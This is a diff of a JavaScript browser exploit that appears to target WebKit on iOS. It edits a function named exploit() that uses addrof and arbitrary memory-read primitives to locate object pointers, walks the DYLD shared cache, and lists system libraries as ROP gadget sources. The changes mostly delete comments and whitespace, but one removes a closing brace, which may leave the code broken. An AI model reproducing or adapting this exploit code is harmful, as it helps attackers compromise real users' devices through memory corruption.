@@ -526,7 +526,6 @@ function exploit(){
         log('[*] Creating the HTMLDivElement wrapper...');
         var d = document.createElement('div');
         let ad_div = addrof(d);
-        //log(ad_div.lo() + ad_div.hi());
         log('[+] Address of the div is '+ad_div.toString(16));
         let exe_ptr = memory.read_i64(Add(ad_div, new Int64('0x18')),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
@@ -616,10 +615,7 @@ function exploit(){
                 init_rights = "-" + init_rights;
             }
             log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
-
             
-
-
             if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
             {
                 base_seg = seg;
@@ -671,7 +667,7 @@ function exploit(){
                 "/usr/lib/PN548.dylib",     // dispatch, stackloader
                 "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
             ];
-        }
+        
         //print('lookin through cache');
 
         var syms = {};
